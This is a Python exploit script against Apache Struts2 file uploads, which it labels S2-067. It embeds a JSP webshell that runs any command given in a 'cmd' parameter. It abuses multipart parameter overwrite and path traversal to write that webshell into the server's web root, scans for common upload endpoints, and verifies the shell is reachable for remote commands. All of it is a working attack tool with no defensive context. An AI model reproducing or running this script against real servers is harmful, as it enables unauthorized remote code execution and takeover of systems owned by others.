import requests
import random
import string
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Constants for the exploit
HTTP_UPLOAD_PARAM_NAME = "upload"
DEFAULT_WEBSHELL_NAME = "webshell"
DEFAULT_WEBSHELL_FILENAME = f"{DEFAULT_WEBSHELL_NAME}.jsp"
DEFAULT_WEBSHELL_CONTENT = """
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
    }
%>
"""

def generate_random_boundary():
    """Generate a random boundary for multipart form-data requests."""
    return '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def generate_random_filename(extension=".jsp"):
    """Generate a random filename for the uploaded webshell."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + extension

def create_webshell_file(filename, content):
    """Create a JSP webshell file."""
    with open(filename, "w") as f:
        f.write(content)
    print(f"[INFO] Created webshell file: {filename}")

def upload_exploit(target_url, upload_endpoint, payload_filename, malicious_filename, payload_content):
    """
    Exploit Apache Struts2 S2-067 by uploading a malicious payload to a specific endpoint.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Attempting to upload the exploit to {upload_url}...")

    # Randomized multipart boundary
    boundary = generate_random_boundary()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Accept": "*/*"
    }

    # Construct multi-part parameters with parameter overwrite and path traversal
    files = {
        HTTP_UPLOAD_PARAM_NAME.capitalize(): (payload_filename, payload_content, "application/octet-stream"),
        HTTP_UPLOAD_PARAM_NAME + "FileName": f"../webapps/ROOT/{malicious_filename}"
    }

    # Create multipart form-data
    m = MultipartEncoder(fields=files, boundary=boundary)
    headers["Content-Type"] = m.content_type

    try:
        response = requests.post(upload_url, headers=headers, data=m, timeout=10)
        if response.status_code == 200:
            print(f"[SUCCESS] Uploaded malicious file as '{malicious_filename}'.")
            verify_payload(target_url, f"/ROOT/{malicious_filename}")
        else:
            print(f"[ERROR] Upload failed. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response: {response.text[:200]}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Exploit failed: {e}")

def verify_payload(target_url, payload_path):
    """Verify if the uploaded payload exists and is functional."""
    payload_url = urljoin(target_url, payload_path)
    print(f"[INFO] Verifying payload at: {payload_url}...")

    try:
        response = requests.get(payload_url, timeout=10)
        if response.status_code == 200:
            print(f"[ALERT] Exploit successful! Access the payload at: {payload_url}?cmd=<COMMAND>")
        elif response.status_code == 404:
            print(f"[INFO] Payload not found. The server may not be vulnerable.")
        else:
            print(f"[INFO] Unexpected response. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response Content: {response.text[:200]}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")

def discover_upload_endpoint(target_url):
    """Attempt to discover common upload endpoints for Apache Struts2."""
    print("[INFO] Attempting to discover common upload endpoints...")
    common_endpoints = [
        "/upload.action",
        "/fileUpload.action",
        "/uploadFile.action",
        "/struts2-showcase/fileUpload.action"
    ]

    for endpoint in common_endpoints:
        test_url = urljoin(target_url, endpoint)
        try:
            response = requests.options(test_url, timeout=5)
            if response.status_code in [200, 403]:
                print(f"[INFO] Potential upload endpoint found: {endpoint}")
                return endpoint
        except requests.exceptions.RequestException:
            continue
    print("[WARNING] No common upload endpoints discovered.")
    return None

def main():
    parser = argparse.ArgumentParser(description="Apache Struts2 S2-067 Exploit Script")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", help="Path to file upload endpoint (e.g., /upload.action)")
    parser.add_argument("--payload_filename", default=DEFAULT_WEBSHELL_FILENAME, help="Legitimate filename for upload (default: webshell.jsp)")
    parser.add_argument("--malicious_filename", default=DEFAULT_WEBSHELL_FILENAME, help="Filename for the malicious payload (e.g., webshell.jsp)")
    parser.add_argument("--payload", default=DEFAULT_WEBSHELL_CONTENT, help="Custom payload content for the webshell")
    args = parser.parse_args()

    print("[INFO] Starting Apache Struts2 S2-067 Exploit...")

    target_url = args.url.rstrip("/")
    payload_filename = args.payload_filename
    malicious_filename = args.malicious_filename
    payload_content = args.payload

    # Create the webshell file
    create_webshell_file(payload_filename, payload_content)

    # Discover endpoint if not provided
    upload_endpoint = args.upload_endpoint
    if not upload_endpoint:
        upload_endpoint = discover_upload_endpoint(target_url)
        if not upload_endpoint:
            print("[ERROR] No valid upload endpoints discovered. Exiting.")
            return

    # Execute exploit
    upload_exploit(target_url, upload_endpoint, payload_filename, malicious_filename, payload_content)
    print("[INFO] Exploit process completed.")

if __name__ == "__main__":
    main()
